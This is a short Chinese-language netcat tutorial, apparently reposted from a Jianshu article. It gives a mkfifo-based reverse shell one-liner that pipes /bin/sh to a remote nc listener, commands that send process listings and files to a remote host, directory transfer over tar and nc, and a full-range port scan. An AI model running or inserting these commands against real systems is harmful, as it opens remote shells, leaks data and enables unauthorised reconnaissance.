> 因为版本不同，有的版本没有 -e -c 选项，解决： https://superuser.com/questions/691008/why-is-the-e-option-missing-from-netcat-openbsd

> 来源：https://www.jianshu.com/p/cb26a0f6c622

# 远程控制（反向shell）
引入：
- -l: 监听入站信息
- -v: 详细信息
- -p: 本地端口

被控制端：  
`rm -f /tmp/f; mkfifo /tmp/f`  
`cat /tmp/f | /bin/sh -i 2>&1 | nc ×××××× 1234 > /tmp/f`

控制端：
`nc -lvp 1234`

# 使用NC进行信息收集
引入：
- -n 禁止名称/端口解析
- -q quit after EOF on stdin and delay of secs
> 场景1

监听指定端口号：`nc -l -p port`  
连接对方tcp端口：`nc -nv ip port`  
ps:默认情况下，双方可以发送文本信息
> 场景2

将远程发送过来的内容保存在本地：`nc -l -p 4444 >wing.txt`  
标准输入完成后delay一秒钟，会发送到侦听端：`ps aux |nc -nv ip port -q 1`


# NC传输文件/目录

- 场景1  
存储文件：`nc -lp 4444 >1.txt`  
读取文件：`nc -nv ip port <1.txt -q 1`

`ps`：侦听端的文件名最好按照文件本身来命名

- 场景2

将目录打包：`tar -cvf - 目录名/|nc -lp port -q 1`

将目录解包：`nc -nv ip port |tar -xvf -`

# NC端口扫描 

nc -nvz ip 1-65535